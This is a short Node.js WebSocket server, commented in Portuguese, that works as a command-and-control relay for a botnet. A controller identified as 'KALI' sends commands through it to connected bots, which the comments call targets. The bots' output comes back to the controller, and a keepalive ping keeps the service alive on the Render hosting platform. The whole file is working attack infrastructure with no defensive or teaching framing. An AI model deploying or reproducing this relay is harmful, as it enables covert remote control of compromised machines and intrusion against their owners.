const WebSocket = require('ws');
const http = require('http');

const PORT = process.env.PORT || 10000;
const server = http.createServer((_, r) => r.end('Service Online'));
const wss = new WebSocket.Server({ server });

let KALI = null;
const BOTS = new Map();

wss.on('connection', (ws, req) => {
    const params = new URLSearchParams(req.url.split('?')[1]);
    const id = params.get('id');

    if (id === 'KALI') {
        KALI = ws;
        console.log('[+] Controlador conectado');
        BOTS.forEach((_, botId) => {
            if (KALI.readyState === WebSocket.OPEN) {
                KALI.send(JSON.stringify({ t: 'bot', s: 'on', id: botId }));
            }
        });
    } else if (id) {
        BOTS.set(id, ws);
        if (KALI && KALI.readyState === WebSocket.OPEN) {
            KALI.send(JSON.stringify({ t: 'bot', s: 'on', id: id }));
        }
    }

    ws.on('message', (message) => {
        if (ws === KALI) {
            try {
                const packet = JSON.parse(message);
                const target = BOTS.get(packet.to);
                if (target && target.readyState === WebSocket.OPEN) {
                    target.send(packet.cmd);
                }
            } catch (e) { /* Erro de Parsing */ }
        } else if (id) {
            if (KALI && KALI.readyState === WebSocket.OPEN) {
                // Encaminha resposta do alvo para o Kali
                KALI.send(JSON.stringify({ t: 'res', f: id, d: message.toString() }));
            }
        }
    });

    ws.on('close', () => {
        if (ws === KALI) KALI = null;
        else if (id) {
            BOTS.delete(id);
            if (KALI && KALI.readyState === WebSocket.OPEN) {
                KALI.send(JSON.stringify({ t: 'bot', s: 'off', id: id }));
            }
        }
    });

    ws.on('error', () => {});
});

// Previne timeout do Render
setInterval(() => {
    wss.clients.forEach(client => {
        if (client.readyState === WebSocket.OPEN) client.ping();
    });
}, 20000);

server.listen(PORT);
